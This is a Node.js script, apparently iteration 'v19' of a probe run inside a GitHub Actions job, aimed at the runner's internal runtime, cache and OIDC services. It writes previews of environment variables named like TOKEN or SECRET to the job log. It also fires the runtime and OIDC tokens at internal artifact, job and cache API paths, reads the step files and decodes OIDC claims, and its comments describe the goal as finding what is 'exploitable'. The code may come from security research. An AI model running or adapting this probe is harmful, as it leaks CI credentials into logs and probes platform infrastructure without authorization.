const https = require('https');
const crypto = require('crypto');

// v19: Probe ACTIONS_RUNTIME_URL + ACTIONS_CACHE_URL
// These were passed to Docker containers in the Jekyll Pages build via -e flags
// Checking if they're still alive and exploitable in shell steps too

const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const GITHUB_REPOSITORY = process.env.GITHUB_REPOSITORY || '';
const GITHUB_RUN_ID = process.env.GITHUB_RUN_ID || '';
const ACTIONS_ORCHESTRATION_ID = process.env.ACTIONS_ORCHESTRATION_ID || '';

// The old-style APIs
const RUNTIME_URL = process.env.ACTIONS_RUNTIME_URL || '';
const RUNTIME_TOKEN = process.env.ACTIONS_RUNTIME_TOKEN || '';
const CACHE_URL = process.env.ACTIONS_CACHE_URL || '';
const RESULTS_URL = process.env.ACTIONS_RESULTS_URL || '';

// Also check GITHUB_STATE and GITHUB_OUTPUT (inter-step comms)
const GITHUB_STATE = process.env.GITHUB_STATE || '';
const GITHUB_OUTPUT = process.env.GITHUB_OUTPUT || '';
const GITHUB_ENV = process.env.GITHUB_ENV || '';
const RUNNER_TEMP = process.env.RUNNER_TEMP || '';

function get(hostname, path, token) {
  return new Promise((resolve) => {
    const r = https.request({ hostname, path, method: 'GET',
      headers: { 'Authorization': 'Bearer ' + token, 'Accept': 'application/json' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 400) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.end();
  });
}

function post(hostname, path, token, body) {
  return new Promise((resolve) => {
    const s = typeof body === 'string' ? body : JSON.stringify(body);
    const r = https.request({ hostname, path, method: 'POST',
      headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(s), 'Accept': 'application/json' }
    }, (res) => { let d=''; res.on('data', c=>d+=c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 600) })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.write(s); r.end();
  });
}

async function main() {
  console.log('=== V19: ACTIONS_RUNTIME_URL + ACTIONS_CACHE_URL probe ===');
  console.log('Repo:', GITHUB_REPOSITORY, '| Run:', GITHUB_RUN_ID);

  // === PART 1: Full env dump — what ACTIONS_* vars exist? ===
  console.log('\n=== PART 1: ACTIONS_* + runner env vars ===');
  const allKeys = Object.keys(process.env).sort();
  for (const k of allKeys) {
    if (/ACTIONS|RUNNER|GITHUB|RUNTIME|CACHE|OIDC|TOKEN|SECRET/.test(k)) {
      const v = process.env[k] || '';
      const preview = v.length > 60 ? v.substring(0, 60) + '...(len=' + v.length + ')' : v;
      console.log('[ENV] ' + k + '=' + preview);
    }
  }

  // === PART 2: Test ACTIONS_RUNTIME_URL (old REST API) ===
  console.log('\n=== PART 2: ACTIONS_RUNTIME_URL (old pipeline API) ===');
  if (RUNTIME_URL) {
    const u = new URL(RUNTIME_URL);
    console.log('RUNTIME_URL:', RUNTIME_URL.substring(0, 80));
    console.log('RUNTIME_TOKEN len:', RUNTIME_TOKEN.length);
    // Old API endpoints
    const oldPaths = [
      '/_apis/pipelines/workflows/' + GITHUB_RUN_ID + '/artifacts',
      '/_apis/build/artifacts?buildId=' + GITHUB_RUN_ID + '&api-version=6.0',
      '/_apis/distributedtask/hubs/build/plans/' + ACTIONS_ORCHESTRATION_ID.split('.')[0] + '/artifacts',
      '/_apis/pipelines/workflows/' + GITHUB_RUN_ID + '/jobs',
      '/_apis/pipelines/workflows/' + GITHUB_RUN_ID + '/jobs/0/steps',
    ];
    for (const p of oldPaths) {
      const r = await get(u.hostname, p, RUNTIME_TOKEN);
      console.log('[RUNTIME] ' + p.split('/').slice(-2).join('/') + ': ' + r.status + ' | ' + r.body.substring(0, 120));
    }
  } else {
    console.log('[RUNTIME] ACTIONS_RUNTIME_URL is NOT SET in shell env');
  }

  // === PART 3: Test ACTIONS_CACHE_URL (old cache REST API) ===
  console.log('\n=== PART 3: ACTIONS_CACHE_URL (old cache API) ===');
  if (CACHE_URL) {
    const u = new URL(CACHE_URL);
    console.log('CACHE_URL:', CACHE_URL.substring(0, 80));
    // Old cache API (REST, pre-Twirp)
    const cachePaths = [
      '/_apis/artifactcache/cache',
      '/_apis/artifactcache/caches',
      '/_apis/artifactcache/cache?keys=test&version=abc',
    ];
    for (const p of cachePaths) {
      const r = await get(u.hostname, p, RUNTIME_TOKEN);
      console.log('[CACHE] ' + p + ': ' + r.status + ' | ' + r.body.substring(0, 150));
    }
  } else {
    console.log('[CACHE] ACTIONS_CACHE_URL is NOT SET in shell env');
  }

  // === PART 4: Test ACTIONS_RESULTS_URL (Twirp endpoint — may be gone) ===
  console.log('\n=== PART 4: ACTIONS_RESULTS_URL (Twirp API) ===');
  if (RESULTS_URL) {
    console.log('RESULTS_URL present:', RESULTS_URL.substring(0, 80));
  } else {
    console.log('[RESULTS] ACTIONS_RESULTS_URL is NOT SET (confirmed gone in 20260611.554)');
  }

  // === PART 5: Check if GITHUB_OUTPUT/ENV file can be read (inter-step injection) ===
  console.log('\n=== PART 5: GitHub file commands (inter-step comms) ===');
  const fs = require('fs');
  console.log('GITHUB_OUTPUT path:', GITHUB_OUTPUT || 'NOT_SET');
  console.log('GITHUB_ENV path:', GITHUB_ENV || 'NOT_SET');
  console.log('GITHUB_STATE path:', GITHUB_STATE || 'NOT_SET');
  console.log('RUNNER_TEMP:', RUNNER_TEMP || 'NOT_SET');

  if (GITHUB_OUTPUT) {
    try {
      const existing = fs.readFileSync(GITHUB_OUTPUT, 'utf8');
      console.log('[OUTPUT] Current GITHUB_OUTPUT contents:', existing || '(empty)');
    } catch(e) { console.log('[OUTPUT] Cannot read GITHUB_OUTPUT:', e.message); }
    // Can we inject into GITHUB_ENV to set env vars for subsequent steps?
    // This is legitimate within our own job, but interesting for understanding the mechanic
    try {
      const testContent = fs.readFileSync(GITHUB_ENV, 'utf8');
      console.log('[ENV_FILE] Current GITHUB_ENV contents:', testContent.substring(0, 200) || '(empty)');
    } catch(e) { console.log('[ENV_FILE] Cannot read GITHUB_ENV:', e.message); }
  }

  // === PART 6: OIDC token analysis — check issuer_scope and enterprise claims ===
  console.log('\n=== PART 6: OIDC JWT full claim analysis ===');
  if (OIDC_URL && OIDC_TOKEN) {
    const u = new URL(OIDC_URL);
    const path = u.pathname + u.search + '&audience=api.github.com';
    const r = await get(u.hostname, path, OIDC_TOKEN);
    if (r.status === 200) {
      try {
        const jwt = JSON.parse(r.body).value;
        const payload = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
        console.log('[OIDC_CLAIMS] ALL CLAIMS:');
        for (const [k, v] of Object.entries(payload)) {
          console.log('  ' + k + ' = ' + JSON.stringify(v));
        }
        // Specifically check enterprise claims
        console.log('[OIDC] enterprise:', payload.enterprise || 'NOT_PRESENT');
        console.log('[OIDC] enterprise_id:', payload.enterprise_id || 'NOT_PRESENT');
        console.log('[OIDC] issuer_scope:', payload.issuer_scope || 'NOT_PRESENT');
        console.log('[OIDC] runner_environment:', payload.runner_environment || 'NOT_PRESENT');
        console.log('[OIDC] check_run_id:', payload.check_run_id || 'NOT_PRESENT');
      } catch(e) { console.log('[OIDC] Parse error:', e.message); }
    }
  }

  // === PART 7: Try old-style cache API on OIDC host ===
  console.log('\n=== PART 7: Old cache API on new OIDC host ===');
  if (OIDC_URL) {
    const u = new URL(OIDC_URL);
    const poolId = u.pathname.split('/')[1];
    // Try old cache endpoints on the new host
    const cachePaths = [
      '/_apis/artifactcache/cache',
      '/api/v3/artifactcache/cache',
      '/' + poolId + '/caches',
      '/' + poolId + '//caches/list',
    ];
    for (const p of cachePaths) {
      const r = await get(u.hostname, p, OIDC_TOKEN);
      if (r.status !== 404 && !r.body.includes('hmac is missing')) {
        console.log('[LEGACY_CACHE] ' + p + ': ' + r.status + ' | ' + r.body.substring(0, 150));
      }
    }
    console.log('[LEGACY_CACHE] done (404s and hmac-errors suppressed)');
  }

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message));
